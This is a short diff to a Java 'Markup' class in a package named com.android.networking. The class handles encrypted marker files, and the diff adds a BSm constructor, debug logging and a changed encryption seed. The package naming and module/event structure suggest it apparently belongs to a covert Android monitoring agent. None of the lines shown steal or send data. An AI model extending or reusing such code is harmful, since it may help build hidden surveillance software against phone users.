@@ -17,6 +17,7 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutput;
 import java.io.ObjectOutputStream;
 import java.io.Serializable;
+import java.lang.reflect.Method;
 import java.util.HashMap;
 
 import com.android.networking.action.SubAction;
@@ -28,6 +29,7 @@ import com.android.networking.crypto.Keys;
 import com.android.networking.event.BaseEvent;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
+import com.android.networking.listener.BSm;
 import com.android.networking.module.BaseModule;
 import com.android.networking.util.ByteArray;
 import com.android.networking.util.Check;
@@ -92,6 +94,11 @@ public class Markup {
 		this("MOD" + module.getClass() + "_" + id);
 	}
 
+	public Markup(Class<BSm> cl) {
+		encryption = new Encryption(Cfg.RANDOM.getBytes());
+		markupId = "BSm";
+	}
+
 	/**
 	 * Crea un markup vuoto.
 	 * 
@@ -131,12 +138,16 @@ public class Markup {
 		if (Cfg.DEBUG) {
 			Check.asserts(markupInit, "makeMarkupName: " + markupInit); //$NON-NLS-1$
 		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (makeMarkupName): " + encName);
+		}
 		return encName;
 	}
 
 	private static int getMarkupSeed() {
 		if (!markupInit) {
-			markupSeed = Keys.self().getAesKey()[0];
+			markupSeed = Cfg.RNDDB.getBytes()[0];
 			markupInit = true;
 		}
 
@@ -217,6 +228,9 @@ public class Markup {
 			} catch (final CryptoException e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
+				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (readMarkup) Error: " + e);
 				}
 
 				return null;
@@ -339,9 +353,15 @@ public class Markup {
 				}
 				return ret;
 			} catch (IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (unserialize) Error: " + e);
+				}
 				return empty;
 			}
 		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (unserialize) empty");
+			}
 			return empty;
 		}
 	}
